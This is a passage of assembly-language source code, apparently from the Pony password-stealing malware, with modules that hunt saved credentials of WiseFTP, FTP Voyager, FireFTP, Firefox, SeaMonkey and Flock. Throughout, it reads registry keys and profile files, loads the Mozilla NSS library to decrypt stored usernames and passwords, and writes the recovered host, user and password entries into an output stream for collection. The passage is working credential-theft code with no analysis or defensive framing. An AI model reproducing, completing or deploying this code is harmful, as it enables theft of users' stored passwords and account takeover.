			invoke	ExtractFilePath, Dir
			.IF	eax
				push	eax
				mov	ini_dir, eax
				invoke	DirectoryExists, ini_dir
				.IF	eax
					invoke	CommonFileScan, stream, ini_dir, offset CWiseFTPIniFile1, ITEMHDR_ID or 2
					invoke	CommonFileScan, stream, ini_dir, offset CWiseFTPIniFile2, ITEMHDR_ID or 2
					invoke	CommonFileScan, stream, ini_dir, offset CWiseFTPBinFileMask, ITEMHDR_ID or 0
				.ENDIF
				call	MemFree
			.ENDIF
			invoke	MemFree, Dir
			
			; recursively scan subfolders
			invoke	WiseFTPScanRegIni, stream, BaseKey, S			
			invoke	MemFree, S
			
			inc	KeyIndex			
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF
	ret
WiseFTPScanRegIni endp

GrabWiseFTP proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_WISEFTP, 0
	mov	hdr_ofs, eax

	; Site manager (%APPDATA%)
	invoke	AppDataCommonFileScan, stream, offset CWiseFTPAppDataDir, offset CWiseFTPBinFileMask, ITEMHDR_ID or 0

	; Quick connections stored in registry
	invoke	WiseFTPScanReg, stream, dwCurrentUserKey, offset CWiseFTPRegPath
	invoke	WiseFTPScanReg, stream, HKEY_LOCAL_MACHINE, offset CWiseFTPRegPath
	
	; Ini files inside installation directory (older versions)
	invoke	WiseFTPScanRegIni, stream, HKEY_LOCAL_MACHINE, offset CWiseFTP_IniRegPath1
	invoke	WiseFTPScanRegIni, stream, HKEY_LOCAL_MACHINE, offset CWiseFTP_IniRegPath2

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabWiseFTP endp
ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; FTP Voyager 11.x-16.x
; http://www.ftpvoyager.com/
; Tested: Version 16.1.0.0
; Tested: Version 15.2.0.17
; Tested: Version 15.2.0.19
; SFTP: implemented

IFDEF COMPILE_MODULE_FTPVOYAGER

.data
	CFTPVoyagerProfileFile1	db	'FTPVoyager.ftp',0
	CFTPVoyagerProfileFile2	db	'FTPVoyager.ftp.backup',0
	CFTPVoyagerProfileFile3	db	'FTPVoyager.ftp.old.backup',0
	CFTPVoyagerQuickFile	db	'FTPVoyager.qc',0
	CFTPVoyagerAppDataDir	db	'\RhinoSoft.com',0

.code

FTPVoyagerCommonFileScan proc stream, csidl
	invoke	SHGetFolderPathStr, csidl
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, offset CFTPVoyagerAppDataDir
		push	eax
		push	eax
		push	eax
		push	eax
		invoke	CommonFileScan, stream, eax, offset CFTPVoyagerProfileFile1, ITEMHDR_ID or 0
		pop	eax
		invoke	CommonFileScan, stream, eax, offset CFTPVoyagerProfileFile2, ITEMHDR_ID or 0
		pop	eax
		invoke	CommonFileScan, stream, eax, offset CFTPVoyagerProfileFile3, ITEMHDR_ID or 0
		pop	eax
		invoke	CommonFileScan, stream, eax, offset CFTPVoyagerQuickFile, ITEMHDR_ID or 1
		call	MemFree
	.ENDIF
	ret
FTPVoyagerCommonFileScan endp

GrabFTPVoyager proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_FTPVOYAGER, 0
	mov	hdr_ofs, eax
	
	invoke	FTPVoyagerCommonFileScan, stream, CSIDL_APPDATA
	invoke	FTPVoyagerCommonFileScan, stream, CSIDL_COMMON_APPDATA
	invoke	FTPVoyagerCommonFileScan, stream, CSIDL_LOCAL_APPDATA
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabFTPVoyager endp

ENDIF

IFDEF COMPILE_MODULE_FIREFOX 
	COMPILE_MOZILLA_CODE	equ	1
ELSEIFDEF COMPILE_MODULE_FIREFTP 
	COMPILE_MOZILLA_CODE	equ	1
ELSEIFDEF COMPILE_MODULE_SEAMONKEY 
	COMPILE_MOZILLA_CODE	equ	1
ELSEIFDEF COMPILE_MODULE_FLOCK 
	COMPILE_MOZILLA_CODE	equ	1
ELSEIFDEF COMPILE_MODULE_MOZILLA
	COMPILE_MOZILLA_CODE	equ	1
ELSEIFDEF COMPILE_MODULE_EPIC
	COMPILE_MOZILLA_CODE	equ	1
ELSEIFDEF COMPILE_MODULE_KMELEON
	COMPILE_MOZILLA_CODE	equ	1
ENDIF

; E-mail modules
IFDEF GRAB_EMAIL
	IFDEF	COMPILE_MODULE_THUNDERBIRD
		COMPILE_MOZILLA_CODE	equ	1
	ENDIF
ENDIF


; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Mozilla products common password decryption
; SFTP: not supported

IFDEF COMPILE_MOZILLA_CODE 

.data
	szNSS3Imports		db	'nss3.dll',0
				db	'NSS_Init',0
				db	'NSS_Shutdown',0
				db	'NSSBase64_DecodeBuffer',0
				db	'SECITEM_FreeItem',0
				db	'PK11_GetInternalKeySlot',0
				db	'PK11_Authenticate',0
				db	'PK11SDR_Decrypt',0
				db	'PK11_FreeSlot',0
				db	0
				
	NSS_Init		dd	0
	NSS_Shutdown		dd	0
	NSSBase64_DecodeBuffer	dd	0
	SECITEM_FreeItem	dd	0
	PK11_GetInternalKeySlot	dd	0
	PK11_Authenticate	dd	0
	PK11SDR_Decrypt		dd	0
	PK11_FreeSlot		dd	0

	MOZILLA_MODE_FTP_HTTP	equ 0
	MOZILLA_MODE_FIREFTP	equ 1
	MOZILLA_MODE_EMAIL		equ 2
	MOZILLA_MODE_EMAIL_CONFIG	equ 3

	mozilla_mode		dd	0 ; 0 - FTP/HTTP; 1 - FireFTP; 2 - E-mail
	mozilla_slot		dd	0
	
	szMozillaProfileIni	db	'profiles.ini',0
	szMozillaProfile	db	'Profile',0
	szMozillaIniIsRelative	db	'IsRelative',0
	szMozillaIniPath	db	'Path',0
	szMozillaPathToExe	db	'PathToExe',0
	szMozillaPrefsJS	db	'prefs.js',0
	szMozillaSQLiteFile	db	'signons.sqlite',0
	szMozillaSignons	db	'signons.txt',0
	szMozillaSignons2	db	'signons2.txt',0
	szMozillaSignons3	db	'signons3.txt',0
	
	szMozillaSignonsID	db	'#2c',0
	szMozillaSignonsID2	db	'#2d',0
	szMozillaSignonsID3	db	'#2e',0
	
	szMozillaFirefox	db	'Firefox',0
	szMozillaFirefoxBaseRegPath	db	'\Mozilla\Firefox\',0
	szMozillaBaseRegPath	db	'Software\Mozilla',0
	szMozillaDashes		db	'---',0
	
	szMozillaFTP		db	'ftp://',0
	IFDEF	GRAB_HTTP
	szMozillaHTTP		db	'http://',0
	szMozillaHTTPS		db	'https://',0
	ENDIF
	szMozillaFireFTP	db	'ftp.',0

.code

MozillaInitNSSDecryption proc uses ebx szProfilePath, szAppPath
	mov	mozilla_slot, 0
	sub	ebx, ebx

	invoke	lstrlen, szProfilePath
	mov	edx, szProfilePath
	.IF	eax > 2
		add	edx, eax
		sub	edx, 2
		.IF	word ptr[edx] == '\\'
			mov	word ptr[edx], '\'
		.ENDIF
	.ENDIF
	
	invoke	SetCurrentDirectory, szAppPath
	
	invoke	LoadDllImports, offset szNSS3Imports, offset NSS_Init
	.IF	eax
		push	szProfilePath
		call	NSS_Init
		add	esp, 4*1
		.IF	!eax
			call	PK11_GetInternalKeySlot
			mov	mozilla_slot, eax
			
			.IF	!mozilla_slot
				call	NSS_Shutdown
			.ELSE
				push	NULL
				push	TRUE
				push	mozilla_slot
				call	PK11_Authenticate
				add	esp, 4*3
				.IF	eax
					; authentication failed
					push	mozilla_slot
					call	PK11_FreeSlot
					add	esp, 4*1
					call	NSS_Shutdown
					mov	mozilla_slot, 0
				.ELSE
					; success!
					inc	ebx
				.ENDIF
			.ENDIF
		.ENDIF 
	.ENDIF
	
	mov	eax, ebx
	
	ret
MozillaInitNSSDecryption endp

MozillaFinalNSSDecryption proc
	.IF	mozilla_slot
		push	mozilla_slot
		call	PK11_FreeSlot
		add	esp, 4*1
		call	NSS_Shutdown
		mov	mozilla_slot, 0
	.ENDIF
	ret
MozillaFinalNSSDecryption endp

MozillaNSSDecryptPassword proc uses ebx szPassword, dwDataLen
	LOCAL	EncryptedSECItem: DWORD
	LOCAL	DecryptedSECItem[12]: BYTE
	
	mov	eax, szPassword
	.IF	!eax || !dwDataLen || !byte ptr[eax]
		sub	eax, eax
		ret
	.ENDIF
	
	.IF	byte ptr[eax] != '~' && !mozilla_slot
		sub	eax, eax
		ret
	.ENDIF 
	
	.IF	byte ptr[eax] == '~'
		mov	edx, dwDataLen
		dec	edx
		and	edx, 3
		.IF	edx || dwDataLen == 1
			sub	eax, eax
		.ELSE
			dec	dwDataLen
			mov	eax, dwDataLen
			add	eax, 1024
			shl	eax, 2
			invoke	MemAlloc, eax
			
			push	eax
			mov	edx, szPassword
			inc	edx
			invoke	Base64Decode, edx, dwDataLen, eax
			pop	eax
		.ENDIF
		ret
	.ENDIF
	
	sub	ebx, ebx

	push	dwDataLen
	push	szPassword
	push	NULL
	push	NULL
	call	NSSBase64_DecodeBuffer
	add	esp, 4*4
	
	.IF	eax
		mov	EncryptedSECItem, eax
		
		invoke	ZeroMemory, addr DecryptedSECItem, 12
		
		push	NULL
		lea	eax, DecryptedSECItem
		push	eax
		push	EncryptedSECItem
		call	PK11SDR_Decrypt
		add	esp, 4*3
		
		.IF	!eax
			lea	eax, DecryptedSECItem
			
			.IF	dword ptr[eax+4*1]
				mov	eax, dword ptr[eax+4*2]
				inc	eax
				invoke	MemAlloc, eax
				mov	ebx, eax
				
				lea	eax, DecryptedSECItem
				invoke	MoveMem, dword ptr[eax+4*1], ebx, dword ptr[eax+4*2]
			.ENDIF
			
			push	0
			lea	eax, DecryptedSECItem
			push	eax
			call	SECITEM_FreeItem
			add	esp, 4*2	
		.ENDIF
		
		push	1
		push	EncryptedSECItem
		call	SECITEM_FreeItem
		add	esp, 4*2 
	.ENDIF
	
	mov	eax, ebx
	ret
MozillaNSSDecryptPassword endp

ProcessMozillaSQLiteFile proto :DWORD, :DWORD, :DWORD

MozillaReadSQLFile proc stream, szSQLFile, szProfilePath, szAppPath
	invoke	FileExists, szSQLFile
	.IF	!eax
		ret
	.ENDIF
	
	invoke	IsFileAlreadyProcessed, szSQLFile
	.IF	eax
		ret
	.ENDIF
	
	; Initialize NSS decryption subsystem
	invoke	MozillaInitNSSDecryption, szProfilePath, szAppPath 
	.IF	!eax
		ret
	.ENDIF
	
	; Process SQLite3 database using tiny db engine
	invoke	ProcessMozillaSQLiteFile, stream, szSQLFile, ITEMHDR_ID or 0

	; Finalize NSS decryption subsystem
	invoke	MozillaFinalNSSDecryption
	
	ret
MozillaReadSQLFile endp

MozillaRTrimLine proc uses ebx CurStr
	invoke	PonyStrCat, CurStr, NULL
	mov	ebx, eax
	invoke	lstrlen, ebx
	.IF	eax
		add	eax, ebx
		dec	eax
		.WHILE	eax >= ebx
			.IF	byte ptr[eax] == 0dh || byte ptr[eax] == 0ah
				mov	byte ptr[eax], 0
			.ELSE
				.BREAK
			.ENDIF
			dec	eax
		.ENDW
	.ENDIF	
	mov	eax, ebx
	ret
MozillaRTrimLine endp

MozillaReadSignonsFile proc uses edi stream, szSignonsFile, szProfilePath, szAppPath
	LOCAL	map: MappedFile
	LOCAL	string_list: DWORD
	LOCAL	state: DWORD
	LOCAL	line1: DWORD
	LOCAL	line2: DWORD
	LOCAL	line3: DWORD
	LOCAL	line4: DWORD
	LOCAL	line5: DWORD
	LOCAL	file_ver: DWORD
	LOCAL	cur_line: DWORD
	LOCAL	user_line: DWORD
	LOCAL	pass_line: DWORD
	LOCAL	host_line: DWORD
	LOCAL	user: DWORD
	LOCAL	pass: DWORD
	LOCAL	is_old_ver: DWORD

	invoke	FileExists, szSignonsFile
	.IF	!eax
		ret
	.ENDIF
	
	invoke	IsFileAlreadyProcessed, szSignonsFile
	.IF	eax
		ret
	.ENDIF

	; Initialize NSS decryption subsystem
	invoke	MozillaInitNSSDecryption, szProfilePath, szAppPath 

	invoke	MapFile, szSignonsFile, addr map
	.IF	eax
		invoke	ProcessStringList, map.lpMem, map.dwFileSize
		.IF	eax
			mov	string_list, eax
			mov	edi, eax
			
			.IF	byte ptr[edi]
				invoke	MozillaRTrimLine, edi
				mov	file_ver, eax
				
				; verify file version
				invoke	lstrcmp, offset szMozillaSignonsID, file_ver
				push	eax
				invoke	lstrcmp, offset szMozillaSignonsID2, file_ver
				push	eax
				invoke	lstrcmp, offset szMozillaSignonsID3, file_ver
				pop	edx
				pop	ecx
				.IF	!eax || !edx || !ecx
					.IF	!ecx
						mov	is_old_ver, 1
					.ELSE
						mov	is_old_ver, 0
					.ENDIF
					; skip version line
					@Next	@F
					@@:
					
					; skip domains for which passwords are never saved
					mov	state, 0
					
					@@:
					.IF	byte ptr[edi]
						invoke	MozillaRTrimLine, edi
						mov	cur_line, eax
						
						.IF	state == 0
							invoke	lstrcmp, cur_line, offset szFilePoint
							.IF	!eax
								mov	state, 1
							.ENDIF
						.ELSE
							.IF state == 1
								; host
								mov	line1, edi
								mov	state, 2
							.ELSEIF state == 2
								; user_input_name
								mov	line2, edi
								mov	state, 3
							.ELSEIF state == 3
								; encrypted user
								mov	line3, edi
								mov	state, 4
							.ELSEIF state == 4
								; password_input_name
								mov	line4, edi
								mov	state, 5
							.ELSEIF state == 5
								; encrypted password
								mov	line5, edi
								.IF	is_old_ver
									; 5 lines
									mov	state, 2
								.ELSE
									mov	state, 6
								.ENDIF
								
								mov	host_line, 0
								mov	user_line, 0
								mov	pass_line, 0
								mov	user, 0
								mov	pass, 0
								
								invoke	MozillaRTrimLine, line1
								mov	host_line, eax
								
								invoke	MozillaRTrimLine, line3
								mov	user_line, eax
								
								invoke	MozillaRTrimLine, line5
								mov	pass_line, eax
								
								.IF	mozilla_mode == MOZILLA_MODE_FTP_HTTP
									invoke	lstrlen, offset szMozillaFTP
									invoke	StrCmpNI, host_line, offset szMozillaFTP, eax
									IFDEF	GRAB_HTTP
									.IF	eax
										invoke	lstrlen, offset szMozillaHTTP
										invoke	StrCmpNI, host_line, offset szMozillaHTTP, eax
									.ENDIF
									.IF	eax
										invoke	lstrlen, offset szMozillaHTTPS
										invoke	StrCmpNI, host_line, offset szMozillaHTTPS, eax
									.ENDIF
									ENDIF									
								.ELSEIF mozilla_mode == MOZILLA_MODE_FIREFTP
									invoke	lstrlen, offset szMozillaFireFTP
									invoke	StrCmpNI, host_line, offset szMozillaFireFTP, eax
								.ELSE
									sub	eax, eax ; allow all mailboxes
								.ENDIF
								
								.IF	!eax
									; user
									invoke	lstrlen, user_line
									invoke	MozillaNSSDecryptPassword, user_line, eax
									mov	user, eax
									
									; pass
									invoke	lstrlen, pass_line
									invoke	MozillaNSSDecryptPassword, pass_line, eax
									mov	pass, eax
									
									.IF	host_line && pass
										; export recovered data
										invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 0
										invoke	StreamWriteString, stream, host_line
										invoke	StreamWriteString, stream, user
										invoke	StreamWriteString, stream, pass
									.ENDIF 
								.ENDIF
								
								invoke	MemFree, host_line
								invoke	MemFree, user_line
								invoke	MemFree, pass_line
								invoke	MemFree, user
								invoke	MemFree, pass
							.ELSEIF	state == 6
								; target host in newer versions
								mov	state, 2	
							.ENDIF
							
							.IF	state != 0
								invoke	lstrcmp, cur_line, offset szFilePoint
								.IF	!eax
									; new site
									mov	state, 1
								.ENDIF
								invoke	lstrcmp, cur_line, offset szMozillaDashes
								.IF	!eax
									; used in newer versions only
									mov	state, 2
								.ENDIF							
							.ENDIF
						.ENDIF
						
						invoke	MemFree, cur_line
						@Next	@B
					.ENDIF
				.ENDIF
				invoke	MemFree, file_ver
			.ENDIF
			invoke	MemFree, string_list
		.ENDIF
		invoke	UnmapFile, addr map
	.ENDIF

	; Finalize NSS decryption subsystem
	invoke	MozillaFinalNSSDecryption
	ret
MozillaReadSignonsFile endp

MozillaCommonFileScan proc stream, szProfilePath, szAppPath, dir
	LOCAL	FindFileData: WIN32_FIND_DATA
	LOCAL	hFind: DWORD
	LOCAL	path: DWORD
	LOCAL	ininame: DWORD

	mov	path, 0
	
	mov	eax, dir
	.IF	(!eax) || (!byte ptr[eax])
		jmp	@not_found
	.ENDIF
	
	invoke	CheckEndSlash, dir
	.IF	!eax
		invoke	PonyStrCat, dir, offset CCommonFileMask
	.ELSE
		invoke	PonyStrCat, dir, offset CCommonFileMaskNoSlash
	.ENDIF
	mov	path, eax
	
	invoke	ZeroMemory, addr FindFileData, sizeof WIN32_FIND_DATA

        invoke  FindFirstFile, path, addr FindFileData
        mov     hFind, eax
        inc     eax
        jz      @not_found

@find_loop:
        lea	edx, FindFileData
        test    [edx].WIN32_FIND_DATA.dwFileAttributes, FILE_ATTRIBUTE_DIRECTORY
        .IF	!ZERO?
        	; is directory, scan recursively
        	
        	; skip "." and ".." path names
        	lea	eax, [edx].WIN32_FIND_DATA.cFileName
        	invoke	lstrcmpi, offset szFilePoint, eax
        	.IF	!eax
        		jmp	@skip
        	.ENDIF
        	
        	lea	edx, FindFileData
        	lea	eax, [edx].WIN32_FIND_DATA.cFileName
        	invoke	lstrcmpi, offset szFilePPoint, eax
        	.IF	!eax
        		jmp	@skip
        	.ENDIF
        	
        	invoke	CheckEndSlash, dir
        	.IF	!eax
			invoke	PonyStrCat, dir, offset szSlash
		.ELSE
			invoke	PonyStrCat, dir, NULL
		.ENDIF
        	lea	edx, FindFileData
		lea	edx, [edx].WIN32_FIND_DATA.cFileName		
		invoke	PonyStrCatFreeArg1, eax, edx
		push	eax
		invoke	MozillaCommonFileScan, stream, szProfilePath, szAppPath, eax
		call	MemFree
        	
        	jmp	@skip
        .ENDIF

	lea	eax, [edx].WIN32_FIND_DATA.cFileName
	mov	ininame, eax
	
	; E-mail config files, do not process any other files
	.IF	mozilla_mode == MOZILLA_MODE_EMAIL_CONFIG
		invoke	StrStrI, ininame, offset szMozillaPrefsJS
		.IF	eax
			invoke	PonyStrCat, dir, offset szSlash
			invoke	PonyStrCatFreeArg1, eax, ininame
			push	eax
			invoke	CommonAppendFile, stream, eax, ITEMHDR_ID or 1
			call	MemFree
		.ENDIF
		jmp	@skip
	.ENDIF

	; Newer signons.sqlite files
	invoke	StrStrI, ininame, offset szMozillaSQLiteFile
	.IF	eax
		invoke	PonyStrCat, dir, offset szSlash
		invoke	PonyStrCatFreeArg1, eax, ininame
		push	eax
		invoke	MozillaReadSQLFile, stream, eax, szProfilePath, szAppPath
		call	MemFree
	.ENDIF

	; Mozilla *.s files
	invoke	lstrlen, ininame
	.IF	eax >= 2
		mov	edx, ininame
		add	edx, eax
		sub	edx, 2
		.IF	word ptr[edx] == 's.'
			jmp	@process_file
		.ENDIF
	.ENDIF
	
	; Firefox signonsN.txt files
	invoke	StrStrI, ininame, offset szMozillaSignons
	push	eax
	invoke	StrStrI, ininame, offset szMozillaSignons2
	push	eax
	invoke	StrStrI, ininame, offset szMozillaSignons3
	pop	edx
	pop	ecx
	.IF	eax || edx || ecx
	@process_file:
		invoke	PonyStrCat, dir, offset szSlash
		invoke	PonyStrCatFreeArg1, eax, ininame
		push	eax
		invoke	MozillaReadSignonsFile, stream, eax, szProfilePath, szAppPath
		call	MemFree
	.ENDIF

@skip:
        invoke  FindNextFile, hFind, addr FindFileData
       	test    eax, eax
       	jnz     @find_loop
       	
	invoke	FindClose, hFind
	
@not_found:
	
	invoke	MemFree, path
	ret
MozillaCommonFileScan endp

MozillaFindPasswordFiles proc stream, szBaseProfilePath, szAppPath
	invoke	MozillaCommonFileScan, stream, szBaseProfilePath, szAppPath, szBaseProfilePath
	ret
MozillaFindPasswordFiles endp

MozillaScanProfiles proc uses edi stream, szBaseProfilePath, szAppPath
	LOCAL	prof_lines: DWORD
	LOCAL	prof_path: DWORD
	LOCAL	prof_base_path: DWORD
	LOCAL	prof_target_path: DWORD
	
	invoke	DirectoryExists, szBaseProfilePath
	.IF	!eax
		ret
	.ENDIF
	
	invoke	DirectoryExists, szAppPath
	.IF	!eax
		ret
	.ENDIF
	
	invoke	CheckEndSlash, szBaseProfilePath
	.IF	!eax
		invoke	PonyStrCat, szBaseProfilePath, offset szSlash
	.ELSE
		invoke	PonyStrCat, szBaseProfilePath, NULL
	.ENDIF	
	mov	prof_base_path, eax

	invoke	PonyStrCat, prof_base_path, offset szMozillaProfileIni
	mov	prof_path, eax

	invoke	MemAlloc, 65002
	mov	prof_lines, eax
	
	invoke	MemAlloc, 4096
	mov	prof_target_path, eax

	invoke	FileExists, prof_path
	.IF	eax
		invoke	GetPrivateProfileSectionNames, prof_lines, 65000, prof_path
		.IF	eax > 2
			mov	edi, prof_lines
			.IF	byte ptr[edi]
			@@:
				invoke	StrStrI, edi, offset szMozillaProfile
				.IF	eax
					invoke	GetPrivateProfileString, edi, offset szMozillaIniPath, offset szNULL, prof_target_path, 4095, prof_path
					.IF	eax
						invoke	GetPrivateProfileInt, edi, offset szMozillaIniIsRelative, 1, prof_path
						.IF	eax == 1
							; Relative profile path
							invoke	PonyStrCat, prof_base_path, prof_target_path
							push	eax
							
							; Fix path slashes
							mov	edx, eax
							.WHILE	edx && byte ptr[edx]
								.IF	byte ptr[edx] == '/'
									mov	byte ptr[edx], '\'
								.ENDIF
								inc	edx
							.ENDW
							invoke	MozillaFindPasswordFiles, stream, eax, szAppPath
							call	MemFree
						.ELSE
							; Absolute profile path
							invoke	MozillaFindPasswordFiles, stream, prof_target_path, szAppPath
						.ENDIF
					.ENDIF
				.ENDIF
				@Next	@B
			.ENDIF
		.ENDIF
	.ENDIF
	
	invoke	MemFree, prof_base_path
	invoke	MemFree, prof_target_path
	invoke	MemFree, prof_path
	invoke	MemFree, prof_lines
	
	invoke	MozillaFindPasswordFiles, stream, szBaseProfilePath, szAppPath
	ret
MozillaScanProfiles endp

MozillaScanRegProfilePaths proc stream, hKey, szBaseRegPath, szAppName, szFolder
	LOCAL	hkHandle: DWORD
	LOCAL	KeyStr: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	NewRegPath: DWORD
	LOCAL	AppPath: DWORD
	
	invoke	StrStrI, szBaseRegPath, szAppName
	.IF	eax
		invoke	RegReadValueStr, hKey, szBaseRegPath, offset szMozillaPathToExe, NULL
		.IF	eax
			push	eax
			invoke	ExtractFilePath, eax
			.IF	eax
				mov	AppPath, eax
				invoke	SHGetFolderPathStr, CSIDL_APPDATA
				.IF	eax
					invoke	PonyStrCatFreeArg1, eax, szFolder
					push	eax
					invoke	MozillaScanProfiles, stream, eax, AppPath
					call	MemFree
				.ENDIF
				invoke	MemFree, AppPath
			.ENDIF
			call	MemFree
		.ENDIF
	.ENDIF
	
	invoke	MemAlloc, 2048
	mov	KeyStr, eax
	invoke	RegOpenKey, hKey, szBaseRegPath, addr hkHandle
	.IF	eax == ERROR_SUCCESS
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumKeyEx, hkHandle, KeyIndex, KeyStr, addr dwBufLen, NULL, NULL, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			
			; BaseRegPath + '\' + KeyStr
			invoke	PonyStrCat, szBaseRegPath, addr szSlash
			invoke	PonyStrCatFreeArg1, eax, KeyStr
			mov	NewRegPath, eax

			; recursively scan subfolders
			invoke	MozillaScanRegProfilePaths, stream, hKey, NewRegPath, szAppName, szFolder
			
			invoke	MemFree, NewRegPath			
			inc	KeyIndex
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF
	invoke	MemFree, KeyStr
	ret
MozillaScanRegProfilePaths endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Mozilla Firefox 0.x-5.x
; http://www.mozilla.org/en-US/firefox/new/
; Tested: Firefox 5.0.1
; Tested: Firefox 12.0
; SFTP: not supported

IFDEF COMPILE_MODULE_FIREFOX

.code

GrabFirefox proc stream
	LOCAL	hdr_ofs: DWORD
	LOCAL	szCurPath[MAX_PATH+1]: BYTE

	invoke	StreamWriteModuleHeader, stream, MODULE_FIREFOX, 0
	mov	hdr_ofs, eax

	mov	mozilla_mode, MOZILLA_MODE_FTP_HTTP
	invoke	GetCurrentDirectory, MAX_PATH, addr szCurPath
	invoke	MozillaScanRegProfilePaths, stream, dwCurrentUserKey, offset szMozillaBaseRegPath, offset szMozillaFirefox, offset szMozillaFirefoxBaseRegPath
	invoke	MozillaScanRegProfilePaths, stream, HKEY_LOCAL_MACHINE, offset szMozillaBaseRegPath, offset szMozillaFirefox, offset szMozillaFirefoxBaseRegPath
	invoke	SetCurrentDirectory, addr szCurPath

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabFirefox endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Mozilla Firefox FireFTP addon
; http://fireftp.mozdev.org/
; Tested: Version 2.0.4
; SFTP: implemented

IFDEF COMPILE_MODULE_FIREFTP

.data
	szFirefoxFireFTPFile	db	'fireFTPsites.dat',0

.code

GrabFireFTP proc stream
	LOCAL	hdr_ofs: DWORD
	LOCAL	szCurPath[MAX_PATH+1]: BYTE

	invoke	StreamWriteModuleHeader, stream, MODULE_FIREFTP, 0
	mov	hdr_ofs, eax

	; additional JSON-formatted data stored by addon
	invoke	SHGetFolderPathStr, CSIDL_APPDATA
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, offset szMozillaFirefoxBaseRegPath
		push	eax
		invoke	CommonFileScan, stream, eax, offset szFirefoxFireFTPFile, ITEMHDR_ID or 1000h
		call	MemFree
	.ENDIF
	
	mov mozilla_mode, MOZILLA_MODE_FIREFTP
	invoke	GetCurrentDirectory, MAX_PATH, addr szCurPath
	invoke	MozillaScanRegProfilePaths, stream, dwCurrentUserKey, offset szMozillaBaseRegPath, offset szMozillaFirefox, offset szMozillaFirefoxBaseRegPath
	invoke	MozillaScanRegProfilePaths, stream, HKEY_LOCAL_MACHINE, offset szMozillaBaseRegPath, offset szMozillaFirefox, offset szMozillaFirefoxBaseRegPath
	invoke	SetCurrentDirectory, addr szCurPath

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabFireFTP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Mozilla SeaMonkey 1.x-2.x
; http://www.seamonkey-project.org/
; SFTP: not supported

IFDEF COMPILE_MODULE_SEAMONKEY

.data
	szMozillaSeaMonkey		db	'SeaMonkey',0
	szMozillaSeaMonkeyBaseRegPath 	db	'\Mozilla\SeaMonkey\',0

.code

GrabSeaMonkey proc stream
	LOCAL	hdr_ofs: DWORD
	LOCAL	szCurPath[MAX_PATH+1]: BYTE

	invoke	StreamWriteModuleHeader, stream, MODULE_SEAMONKEY, 0
	mov	hdr_ofs, eax

	mov mozilla_mode, MOZILLA_MODE_FTP_HTTP
	invoke	GetCurrentDirectory, MAX_PATH, addr szCurPath
	invoke	MozillaScanRegProfilePaths, stream, dwCurrentUserKey, offset szMozillaBaseRegPath, offset szMozillaSeaMonkey, offset szMozillaSeaMonkeyBaseRegPath
	invoke	MozillaScanRegProfilePaths, stream, HKEY_LOCAL_MACHINE, offset szMozillaBaseRegPath, offset szMozillaSeaMonkey, offset szMozillaSeaMonkeyBaseRegPath
	invoke	SetCurrentDirectory, addr szCurPath

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabSeaMonkey endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Mozilla Flock 1.x-2.x
; http://flock.com/
; SFTP: not supported

IFDEF COMPILE_MODULE_FLOCK

.data
	szMozillaFlock			db	'Flock',0
	szMozillaFlockBaseRegPath 	db	'\Flock\Browser\',0

.code

GrabFlock proc stream
	LOCAL	hdr_ofs: DWORD
	LOCAL	szCurPath[MAX_PATH+1]: BYTE

	invoke	StreamWriteModuleHeader, stream, MODULE_FLOCK, 0
	mov	hdr_ofs, eax

	mov mozilla_mode, MOZILLA_MODE_FTP_HTTP
	invoke	GetCurrentDirectory, MAX_PATH, addr szCurPath
	invoke	MozillaScanRegProfilePaths, stream, dwCurrentUserKey, offset szMozillaBaseRegPath, offset szMozillaFlock, offset szMozillaFlockBaseRegPath
	invoke	MozillaScanRegProfilePaths, stream, HKEY_LOCAL_MACHINE, offset szMozillaBaseRegPath, offset szMozillaFlock, offset szMozillaFlockBaseRegPath
	invoke	SetCurrentDirectory, addr szCurPath

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabFlock endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Mozilla Suite Browser 1.x
; SFTP: not supported

